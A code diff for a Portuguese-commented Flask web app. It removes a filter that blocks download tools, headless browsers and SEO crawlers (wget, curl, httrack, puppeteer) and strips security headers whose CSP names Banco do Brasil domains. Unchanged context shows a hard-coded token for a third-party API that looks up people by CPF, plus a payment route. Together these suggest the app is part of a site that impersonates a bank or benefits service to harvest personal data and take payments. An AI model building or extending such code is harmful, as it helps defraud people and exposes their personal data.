@@ -2,10 +2,9 @@ import os
 import requests
 import logging
 import random
-import re
 from datetime import datetime, timedelta
 from typing import Dict, Any
-from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify, make_response
+from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
 
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
@@ -14,77 +13,6 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
 app.static_folder = 'static'
-
-def is_mobile():
-    """Check if user agent is from a mobile device"""
-    user_agent = request.headers.get('User-Agent', '').lower()
-    mobile_patterns = [
-        'mobile', 'android', 'iphone', 'ipad', 'ipod',
-        'webos', 'windows phone', 'iemobile', 'opera mini'
-    ]
-    return any(pattern in user_agent for pattern in mobile_patterns)
-
-@app.before_request
-def check_security():
-    """Enhanced security checks"""
-    # Block known web scraping and site downloading tools
-    blocked_uas = [
-        'httrack', 'wget', 'curl', 'webzip', 'webcopier', 'offline explorer',
-        'web-ripper', 'webstripper', 'web scraper', 'teleport pro',
-        'webreaper', 'websauger', 'saveweb2zip', 'httptrack', 'website extractor',
-        'website copier', 'website ripper', 'linguee', 'selenium', 'phantomjs',
-        'headless chrome', 'puppeteer'
-    ]
-
-    user_agent = request.headers.get('User-Agent', '').lower()
-
-    # Block if no user agent or in blocked list
-    if not user_agent or any(ua in user_agent for ua in blocked_uas):
-        return 'Access Denied', 403
-
-    # Block automated requests
-    if (request.headers.get('X-Requested-With') == 'XMLHttpRequest' and
-        'mozilla' not in user_agent and 'chrome' not in user_agent):
-        return 'Access Denied', 403
-
-    # Block requests with suspicious headers
-    suspicious_headers = ['ahrefs', 'semrush', 'screaming frog', 'deep crawler']
-    for header in request.headers:
-        if any(tool.lower() in str(header).lower() for tool in suspicious_headers):
-            return 'Access Denied', 403
-
-    # Rate limiting
-    if not getattr(request, 'exempt_from_rate_limit', False):
-        ip = request.remote_addr
-        current_time = datetime.now()
-        rate_limit_data = session.get('rate_limit', {})
-
-        if ip in rate_limit_data:
-            last_request_time, count = rate_limit_data[ip]
-            if (current_time - datetime.fromtimestamp(last_request_time)).seconds < 1:
-                if count > 10:  # Max 10 requests per second
-                    return 'Too Many Requests', 429
-                rate_limit_data[ip] = (last_request_time, count + 1)
-            else:
-                rate_limit_data[ip] = (current_time.timestamp(), 1)
-        else:
-            rate_limit_data[ip] = (current_time.timestamp(), 1)
-
-        session['rate_limit'] = rate_limit_data
-
-@app.after_request
-def add_security_headers(response):
-    """Add enhanced security headers"""
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0'
-    response.headers['Pragma'] = 'no-cache'
-    response.headers['X-Permitted-Cross-Domain-Policies'] = 'none'
-    response.headers['Content-Security-Policy'] = "default-src 'self' https://www.bb.com.br https://*.bb.com.br; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; img-src 'self' data: https: http:; font-src 'self' data: https://cdnjs.cloudflare.com;"
-    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-    return response
 
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
@@ -484,10 +412,8 @@ def create_payment_api() -> For4PaymentsAPI:
 
 @app.route('/')
 def index():
-    is_mobile_device = is_mobile()
-    return render_template('index.html', 
-                         is_mobile=is_mobile_device,
-                         current_year=datetime.now().year)
+    return render_template('index.html', current_year=datetime.now().year)
+
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
